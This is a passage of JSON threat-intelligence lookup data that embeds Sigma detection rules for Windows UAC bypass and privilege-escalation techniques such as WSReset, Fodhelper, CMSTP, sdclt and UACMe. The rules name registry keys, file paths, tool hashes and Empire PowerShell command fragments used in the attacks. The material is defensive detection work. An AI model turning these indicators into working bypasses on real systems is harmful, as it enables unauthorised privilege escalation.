+                            "raw": "author: Teymur Kheirkhabarov (idea), Mangatas Tondang (rule), oscd.community\ndate: 2020/10/13\ndescription: Detects Windows Installer service (msiexec.exe) trying to install MSI\n  packages with SYSTEM privilege\ndetection:\n  condition: 1 of selection_image_* and selection_user and not 1 of filter*\n  filter_autoupdater:\n    ParentImage|startswith:\n    - C:\\ProgramData\\Sophos\\\n    - C:\\ProgramData\\Avira\\\n    - C:\\Program Files\\Avast Software\\\n    - C:\\Program Files (x86)\\Avast Software\\\n    - C:\\Program Files\\Google\\Update\\\n    - C:\\Program Files (x86)\\Google\\Update\\\n  filter_installer:\n    ParentImage: C:\\Windows\\System32\\services.exe\n  filter_repair:\n  - CommandLine|endswith: \\system32\\msiexec.exe /V\n  - ParentCommandLine|endswith: \\system32\\msiexec.exe /V\n  selection_image_1:\n    Image|contains|all:\n    - \\Windows\\Installer\\\n    - msi\n    Image|endswith: tmp\n  selection_image_2:\n    Image|endswith: \\msiexec.exe\n    IntegrityLevel: System\n  selection_user:\n    User|contains:\n    - AUTHORI\n    - AUTORI\nfalsepositives:\n- System administrator usage\n- Anti virus products\nfields:\n- IntegrityLevel\n- User\n- Image\nid: cd951fdc-4b2f-47f5-ba99-a33bf61e3770\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/20\nreferences:\n- https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-48-638.jpg\nstatus: experimental\ntags:\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: Always Install Elevated Windows Installer\n",
+                            "sigma:id": "cd951fdc-4b2f-47f5-ba99-a33bf61e3770",
+                            "title": "Always Install Elevated Windows Installer",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4ac47ed3-44c2-4b1f-9d51-bf46e8914126",
+                        "lookup_data": {
+                            "description": "Detects indicators of a UAC bypass method by mocking directories",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/08/27\ndescription: Detects indicators of a UAC bypass method by mocking directories\ndetection:\n  condition: selection\n  selection:\n    Image|contains: C:\\Windows \\System32\\\nfalsepositives:\n- Unknown\nid: 4ac47ed3-44c2-4b1f-9d51-bf46e8914126\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e\n- https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows\n- https://github.com/netero1010/TrustedPath-UACBypass-BOF\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1548.002\ntitle: TrustedPath UAC Bypass Pattern\n",
+                            "sigma:id": "4ac47ed3-44c2-4b1f-9d51-bf46e8914126",
+                            "title": "TrustedPath UAC Bypass Pattern",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "d797268e-28a9-49a7-b9a8-2f5039011c5c",
+                        "lookup_data": {
+                            "description": "Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries use this technique to execute privileged processes.",
+                            "raw": "author: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community,\n  Florian Roth\ndate: 2019/10/24\ndescription: Detects use of WSReset.exe to bypass User Account Control (UAC). Adversaries\n  use this technique to execute privileged processes.\ndetection:\n  condition: selection and not filter\n  filter:\n  - Image|endswith: \\conhost.exe\n  - OriginalFileName: CONHOST.EXE\n  selection:\n    ParentImage|endswith: \\wsreset.exe\nfalsepositives:\n- Unknown sub processes of Wsreset.exe\nid: d797268e-28a9-49a7-b9a8-2f5039011c5c\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/05/13\nreferences:\n- https://eqllib.readthedocs.io/en/latest/analytics/532b5ed4-7930-11e9-8f5c-d46d6d62a49e.html\n- https://lolbas-project.github.io/lolbas/Binaries/Wsreset/\n- https://www.activecyber.us/activelabs/windows-uac-bypass\n- https://twitter.com/ReaQta/status/1222548288731217921\nrelated:\n- id: bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae\n  type: obsoletes\nstatus: test\ntags:\n- attack.privilege_escalation\n- attack.defense_evasion\n- attack.t1548.002\ntitle: Bypass UAC via WSReset.exe\n",
+                            "sigma:id": "d797268e-28a9-49a7-b9a8-2f5039011c5c",
+                            "title": "Bypass UAC via WSReset.exe",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "724ea201-6514-4f38-9739-e5973c34f49a",
+                        "lookup_data": {
+                            "description": "There is an auto-elevated task called SilentCleanup located in %windir%\\system32\\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC",
+                            "raw": "author: frack113\ndate: 2022/01/06\ndescription: There is an auto-elevated task called SilentCleanup located in %windir%\\system32\\cleanmgr.exe\n  This can be abused to elevate any file with Administrator privileges without prompting\n  UAC\ndetection:\n  condition: selection\n  selection:\n    Details|contains: '&REM'\n    EventType: SetValue\n    TargetObject|endswith: \\Environment\\windir\nfalsepositives:\n- Unknown\nid: 724ea201-6514-4f38-9739-e5973c34f49a\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/03/26\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1548.002/T1548.002.md#atomic-test-9---bypass-uac-using-silentcleanup-task\n- https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/\nstatus: test\ntags:\n- attack.privilege_escalation\n- attack.defense_evasion\n- attack.t1548.002\ntitle: Bypass UAC Using SilentCleanup Task\n",
+                            "sigma:id": "724ea201-6514-4f38-9739-e5973c34f49a",
+                            "title": "Bypass UAC Using SilentCleanup Task",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "38cf8340-461b-4857-bf99-23a41f772b18",
+                        "lookup_data": {
+                            "description": "This rule will looks for Windows Installer service (msiexec.exe) spawned command line and/or powershell that spawned other processes",
+                            "raw": "author: Teymur Kheirkhabarov (idea), Mangatas Tondang (rule), oscd.community\ndate: 2020/10/13\ndescription: This rule will looks for Windows Installer service (msiexec.exe) spawned\n  command line and/or powershell that spawned other processes\ndetection:\n  condition: parent_image and parent_of_parent_image\n  parent_image:\n    ParentImage|endswith:\n    - \\cmd.exe\n    - \\powershell.exe\n  parent_of_parent_image:\n    ParentOfParentImage|contains|all:\n    - \\Windows\\Installer\\\n    - msi\n    ParentOfParentImage|endswith:\n    - tmp\nenrichment:\n- EN_0001_cache_sysmon_event_id_1_info\n- EN_0002_enrich_sysmon_event_id_1_with_parent_info\nfalsepositives:\n- Penetration test\nfields:\n- ParentImage\n- ParentOfParentImage\nid: 38cf8340-461b-4857-bf99-23a41f772b18\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://image.slidesharecdn.com/kheirkhabarovoffzonefinal-181117201458/95/hunting-for-privilege-escalation-in-windows-environment-50-638.jpg\nstatus: experimental\ntags:\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: MSI Spawned Cmd and Powershell Spawned Processes\n",
+                            "sigma:id": "38cf8340-461b-4857-bf99-23a41f772b18",
+                            "title": "MSI Spawned Cmd and Powershell Spawned Processes",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "d38d2fa4-98e6-4a24-aff1-410b0c9ad177",
+                        "lookup_data": {
+                            "description": "Detects execution of UACMe (a tool used for UAC bypass) via default PE metadata",
+                            "raw": "author: Christian Burkard (Nextron Systems), Florian Roth\ndate: 2021/08/30\ndescription: Detects execution of UACMe (a tool used for UAC bypass) via default PE\n  metadata\ndetection:\n  condition: 1 of selection*\n  selection_exec:\n    Image|endswith:\n    - \\Akagi64.exe\n    - \\Akagi.exe\n  selection_hash:\n    Imphash:\n    - 767637c23bb42cd5d7397cf58b0be688\n    - 14c4e4c72ba075e9069ee67f39188ad8\n    - 3c782813d4afce07bbfc5a9772acdbdc\n    - 7d010c6bb6a3726f327f7e239166d127\n    - 89159ba4dd04e4ce5559f132a9964eb3\n    - 6f33f4a5fc42b8cec7314947bd13f30f\n    - 5834ed4291bdeb928270428ebbaf7604\n    - 5a8a8a43f25485e7ee1b201edcbc7a38\n    - dc7d30b90b2d8abf664fbed2b1b59894\n    - 41923ea1f824fe63ea5beb84db7a3e74\n    - 3de09703c8e79ed2ca3f01074719906b\n  selection_pe:\n  - Product: UACMe\n  - Company:\n    - REvol Corp\n    - APT 92\n    - UG North\n    - Hazardous Environments\n    - CD Project Rekt\n  - Description:\n    - UACMe main module\n    - Pentesting utility\n  - OriginalFileName:\n    - Akagi.exe\n    - Akagi64.exe\n  selection_sysmon:\n    Hashes|contains:\n    - IMPHASH=767637C23BB42CD5D7397CF58B0BE688\n    - IMPHASH=14C4E4C72BA075E9069EE67F39188AD8\n    - IMPHASH=3C782813D4AFCE07BBFC5A9772ACDBDC\n    - IMPHASH=7D010C6BB6A3726F327F7E239166D127\n    - IMPHASH=89159BA4DD04E4CE5559F132A9964EB3\n    - IMPHASH=6F33F4A5FC42B8CEC7314947BD13F30F\n    - IMPHASH=5834ED4291BDEB928270428EBBAF7604\n    - IMPHASH=5A8A8A43F25485E7EE1B201EDCBC7A38\n    - IMPHASH=DC7D30B90B2D8ABF664FBED2B1B59894\n    - IMPHASH=41923EA1F824FE63EA5BEB84DB7A3E74\n    - IMPHASH=3DE09703C8E79ED2CA3F01074719906B\nfalsepositives:\n- Unknown\nid: d38d2fa4-98e6-4a24-aff1-410b0c9ad177\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/19\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Tool UACMe Akagi\n",
+                            "sigma:id": "d38d2fa4-98e6-4a24-aff1-410b0c9ad177",
+                            "title": "UAC Bypass Tool UACMe Akagi",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1ca6bd18-0ba0-44ca-851c-92ed89a61085",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using consent.exe and comctl32.dll (UACMe 22)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/23\ndescription: Detects the pattern of UAC Bypass using consent.exe and comctl32.dll\n  (UACMe 22)\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\werfault.exe\n    IntegrityLevel:\n    - High\n    - System\n    ParentImage|endswith: \\consent.exe\nfalsepositives:\n- Unknown\nid: 1ca6bd18-0ba0-44ca-851c-92ed89a61085\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Using Consent and Comctl32 - Process\n",
+                            "sigma:id": "1ca6bd18-0ba0-44ca-851c-92ed89a61085",
+                            "title": "UAC Bypass Using Consent and Comctl32 - Process",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae",
+                        "lookup_data": {
+                            "description": "Detects a method that uses Wsreset.exe tool that can be used to reset the Windows Store to bypass UAC",
+                            "raw": "author: Florian Roth\ndate: 2020/01/30\ndescription: Detects a method that uses Wsreset.exe tool that can be used to reset\n  the Windows Store to bypass UAC\ndetection:\n  condition: selection\n  selection:\n    ParentImage|endswith:\n    - \\WSreset.exe\nfalsepositives:\n- Unknown sub processes of Wsreset.exe\nfields:\n- CommandLine\nid: bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2020/08/29\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Wsreset/\n- https://www.activecyber.us/activelabs/windows-uac-bypass\n- https://twitter.com/ReaQta/status/1222548288731217921\nstatus: experimental\ntags:\n- attack.privilege_escalation\n- attack.defense_evasion\n- attack.t1548.002\n- attack.t1088\ntitle: Wsreset UAC Bypass\n",
+                            "sigma:id": "bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae",
+                            "title": "Wsreset UAC Bypass",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "ad92e3f9-7eb6-460e-96b1-582b0ccbb980",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe 55)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/30\ndescription: Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe 55)\ndetection:\n  condition: selection\n  selection:\n    CommandLine: '\"C:\\Windows\\system32\\msconfig.exe\" -5'\n    IntegrityLevel:\n    - High\n    - System\n    ParentImage|endswith: \\AppData\\Local\\Temp\\pkgmgr.exe\nfalsepositives:\n- Unknown\nid: ad92e3f9-7eb6-460e-96b1-582b0ccbb980\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Using MSConfig Token Modification - Process\n",
+                            "sigma:id": "ad92e3f9-7eb6-460e-96b1-582b0ccbb980",
+                            "title": "UAC Bypass Using MSConfig Token Modification - Process",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e66779cc-383e-4224-a3a4-267eeb585c40",
+                        "lookup_data": {
+                            "description": "Detect commandline usage of Microsoft Connection Manager Profile Installer (cmstp.exe) to install specially formatted local .INF files",
+                            "raw": "author: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019/10/24\ndescription: Detect commandline usage of Microsoft Connection Manager Profile Installer\n  (cmstp.exe) to install specially formatted local .INF files\ndetection:\n  condition: all of selection*\n  selection_cli:\n    CommandLine|contains:\n    - /s\n    - -s\n    - /au\n    - -au\n    - /ni\n    - -ni\n  selection_img:\n  - Image|endswith: \\cmstp.exe\n  - OriginalFileName: CMSTP.EXE\nfalsepositives:\n- Legitimate use of cmstp.exe utility by legitimate user\nfields:\n- ComputerName\n- User\n- CommandLine\nid: e66779cc-383e-4224-a3a4-267eeb585c40\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/30\nreferences:\n- https://eqllib.readthedocs.io/en/latest/analytics/e584f1a1-c303-4885-8a66-21360c90995b.html\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.003/T1218.003.md\n- https://lolbas-project.github.io/lolbas/Binaries/Cmstp/\nstatus: test\ntags:\n- attack.privilege_escalation\n- attack.defense_evasion\n- attack.t1548.002\n- attack.t1218.003\ntitle: Bypass UAC via CMSTP\n",
+                            "sigma:id": "e66779cc-383e-4224-a3a4-267eeb585c40",
+                            "title": "Bypass UAC via CMSTP",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "a743ceba-c771-4d75-97eb-8a90f7f4844c",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using pkgmgr.exe and dism.exe (UACMe 23)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/23\ndescription: Detects the pattern of UAC Bypass using pkgmgr.exe and dism.exe (UACMe\n  23)\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\dism.exe\n    IntegrityLevel:\n    - High\n    - System\n    ParentImage|endswith: \\pkgmgr.exe\nfalsepositives:\n- Unknown\nid: a743ceba-c771-4d75-97eb-8a90f7f4844c\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Using PkgMgr and DISM\n",
+                            "sigma:id": "a743ceba-c771-4d75-97eb-8a90f7f4844c",
+                            "title": "UAC Bypass Using PkgMgr and DISM",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5b872a46-3b90-45c1-8419-f675db8053aa",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using registry key manipulation of sdclt.exe (e.g. UACMe 53)",
+                            "raw": "author: Omer Yampel, Christian Burkard (Nextron Systems)\ndate: 2017/03/17\ndescription: Detects the pattern of UAC Bypass using registry key manipulation of\n  sdclt.exe (e.g. UACMe 53)\ndetection:\n  condition: 1 of selection*\n  selection1:\n    EventType: SetValue\n    TargetObject|endswith: Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand\n  selection2:\n    Details|re: -1[0-9]{3}\\\\Software\\\\Classes\\\\\n    EventType: SetValue\n    TargetObject|endswith: Software\\Classes\\Folder\\shell\\open\\command\\SymbolicLinkValue\nfalsepositives:\n- Unknown\nid: 5b872a46-3b90-45c1-8419-f675db8053aa\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/12/01\nreferences:\n- https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/\n- https://github.com/hfiref0x/UACME\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\n- car.2019-04-001\ntitle: UAC Bypass via Sdclt\n",
+                            "sigma:id": "5b872a46-3b90-45c1-8419-f675db8053aa",
+                            "title": "UAC Bypass via Sdclt",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "89a9a0e0-f61a-42e5-8957-b1479565a658",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass via WSReset usable by default sysmon-config",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/23\ndescription: Detects the pattern of UAC Bypass via WSReset usable by default sysmon-config\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\wsreset.exe\n    IntegrityLevel:\n    - High\n    - System\nfalsepositives:\n- Unknown\nid: 89a9a0e0-f61a-42e5-8957-b1479565a658\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Wsreset/\n- https://github.com/hfiref0x/UACME\n- https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass WSReset\n",
+                            "sigma:id": "89a9a0e0-f61a-42e5-8957-b1479565a658",
+                            "title": "UAC Bypass WSReset",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "62ed5b55-f991-406a-85d9-e8e8fdf18789",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using consent.exe and comctl32.dll (UACMe 22)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/23\ndescription: Detects the pattern of UAC Bypass using consent.exe and comctl32.dll\n  (UACMe 22)\ndetection:\n  condition: selection\n  selection:\n    TargetFilename|endswith: \\comctl32.dll\n    TargetFilename|startswith: C:\\Windows\\System32\\consent.exe.@\nfalsepositives:\n- Unknown\nid: 62ed5b55-f991-406a-85d9-e8e8fdf18789\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Using Consent and Comctl32 - File\n",
+                            "sigma:id": "62ed5b55-f991-406a-85d9-e8e8fdf18789",
+                            "title": "UAC Bypass Using Consent and Comctl32 - File",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "68578b43-65df-4f81-9a9b-92f32711a951",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/23\ndescription: Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll\n  (UACMe 32)\ndetection:\n  condition: 1 of selection*\n  selection1:\n    TargetFilename|endswith: \\AppData\\Local\\Temp\\OskSupport.dll\n    TargetFilename|startswith: C:\\Users\\\n  selection2:\n    Image: C:\\Windows\\system32\\DllHost.exe\n    TargetFilename: C:\\Program Files\\Windows Media Player\\osk.exe\nfalsepositives:\n- Unknown\nid: 68578b43-65df-4f81-9a9b-92f32711a951\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Using Windows Media Player - File\n",
+                            "sigma:id": "68578b43-65df-4f81-9a9b-92f32711a951",
+                            "title": "UAC Bypass Using Windows Media Player - File",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "fb3722e4-1a06-46b6-b772-253e2e7db933",
+                        "lookup_data": {
+                            "description": "COM interface (EditionUpgradeManager) that is not used by standard executables.",
+                            "raw": "author: oscd.community, Dmitry Uchakin\ndate: 2020/10/07\ndescription: COM interface (EditionUpgradeManager) that is not used by standard executables.\ndetection:\n  condition: selection\n  selection:\n    CallTrace|contains: editionupgrademanagerobj.dll\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- User\n- SourceImage\n- TargetImage\n- CallTrace\nid: fb3722e4-1a06-46b6-b772-253e2e7db933\nlevel: high\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.snip2code.com/Snippet/4397378/UAC-bypass-using-EditionUpgradeManager-C/\n- https://gist.github.com/hfiref0x/de9c83966623236f5ebf8d9ae2407611\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: Load Undocumented Autoelevated COM Interface\n",
+                            "sigma:id": "fb3722e4-1a06-46b6-b772-253e2e7db933",
+                            "title": "Load Undocumented Autoelevated COM Interface",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "40f9af16-589d-4984-b78d-8c2aec023197",
+                        "lookup_data": {
+                            "description": "A General detection for sdclt being spawned as an elevated process. This could be an indicator of sdclt being used for bypass UAC techniques.",
+                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020/05/02\ndescription: A General detection for sdclt being spawned as an elevated process. This\n  could be an indicator of sdclt being used for bypass UAC techniques.\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: sdclt.exe\n    IntegrityLevel: High\nfalsepositives:\n- Unknown\nid: 40f9af16-589d-4984-b78d-8c2aec023197\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://github.com/OTRF/detection-hackathon-apt29/issues/6\n- https://threathunterplaybook.com/evals/apt29/detections/3.B.2_C36B49B5-DF58-4A34-9FE9-56189B9DEFEA.html\nstatus: test\ntags:\n- attack.privilege_escalation\n- attack.defense_evasion\n- attack.t1548.002\ntitle: High Integrity Sdclt Process\n",
+                            "sigma:id": "40f9af16-589d-4984-b78d-8c2aec023197",
+                            "title": "High Integrity Sdclt Process",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "3268b746-88d8-4cd3-bffc-30077d02c787",
+                        "lookup_data": {
+                            "description": "Detects some Empire PowerShell UAC bypass methods",
+                            "raw": "author: Ecco\ndate: 2019/08/30\ndescription: Detects some Empire PowerShell UAC bypass methods\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - ' -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update)'\n    - ' -NoP -NonI -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update);'\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: 3268b746-88d8-4cd3-bffc-30077d02c787\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/13\nreferences:\n- https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-EventVwrBypass.ps1#L64\n- https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-FodHelperBypass.ps1#L64\nstatus: stable\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\n- car.2019-04-001\ntitle: Empire PowerShell UAC Bypass\n",
+                            "sigma:id": "3268b746-88d8-4cd3-bffc-30077d02c787",
+                            "title": "Empire PowerShell UAC Bypass",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "0058b9e5-bcd7-40d4-9205-95ca5a16d7b2",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/23\ndescription: Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll\n  (UACMe 32)\ndetection:\n  condition: 1 of selection*\n  selection1:\n    Image: C:\\Program Files\\Windows Media Player\\osk.exe\n    IntegrityLevel:\n    - High\n    - System\n  selection2:\n    Image: C:\\Windows\\System32\\cmd.exe\n    IntegrityLevel:\n    - High\n    - System\n    ParentCommandLine: '\"C:\\Windows\\system32\\mmc.exe\" \"C:\\Windows\\system32\\eventvwr.msc\"\n      /s'\nfalsepositives:\n- Unknown\nid: 0058b9e5-bcd7-40d4-9205-95ca5a16d7b2\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Using Windows Media Player - Process\n",
+                            "sigma:id": "0058b9e5-bcd7-40d4-9205-95ca5a16d7b2",
+                            "title": "UAC Bypass Using Windows Media Player - Process",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "7f741dcf-fc22-4759-87b4-9ae8376676a2",
+                        "lookup_data": {
+                            "description": "Identifies use of Fodhelper.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes.",
+                            "raw": "author: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community\ndate: 2019/10/24\ndescription: Identifies use of Fodhelper.exe to bypass User Account Control. Adversaries\n  use this technique to execute privileged processes.\ndetection:\n  condition: selection\n  selection:\n    ParentImage|endswith: \\fodhelper.exe\nfalsepositives:\n- Legitimate use of fodhelper.exe utility by legitimate user\nfields:\n- ComputerName\n- User\n- CommandLine\nid: 7f741dcf-fc22-4759-87b4-9ae8376676a2\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://eqllib.readthedocs.io/en/latest/analytics/e491ce22-792f-11e9-8f5c-d46d6d62a49e.html\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1548.002/T1548.002.md\nstatus: test\ntags:\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: Bypass UAC via Fodhelper.exe\n",
+                            "sigma:id": "7f741dcf-fc22-4759-87b4-9ae8376676a2",
+                            "title": "Bypass UAC via Fodhelper.exe",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "48ea844d-19b1-4642-944e-fe39c2cc1fec",
+                        "lookup_data": {
+                            "description": "Detects the creation of a file by \"dllhost.exe\" in System32 directory part of \"IDiagnosticProfileUAC\" UAC bypass technique",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/07/03\ndescription: Detects the creation of a file by \"dllhost.exe\" in System32 directory\n  part of \"IDiagnosticProfileUAC\" UAC bypass technique\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\DllHost.exe\n    TargetFilename|endswith: .dll\n    TargetFilename|startswith: C:\\Windows\\System32\\\nfalsepositives:\n- Unknown\nid: 48ea844d-19b1-4642-944e-fe39c2cc1fec\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nreferences:\n- https://github.com/Wh04m1001/IDiagnosticProfileUAC\nstatus: experimental\ntags:\n- attack.execution\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Using IDiagnostic Profile - File\n",
+                            "sigma:id": "48ea844d-19b1-4642-944e-fe39c2cc1fec",
+                            "title": "UAC Bypass Using IDiagnostic Profile - File",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "155dbf56-e0a4-4dd0-8905-8a98705045e8",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/30\ndescription: Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe\n  (UACMe 52)\ndetection:\n  condition: selection\n  selection:\n    TargetFilename|endswith:\n    - \\AppData\\Local\\Temp\\system32\\winsat.exe\n    - \\AppData\\Local\\Temp\\system32\\winmm.dll\n    TargetFilename|startswith: C:\\Users\\\nfalsepositives:\n- Unknown\nid: 155dbf56-e0a4-4dd0-8905-8a98705045e8\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Abusing Winsat Path Parsing - File\n",
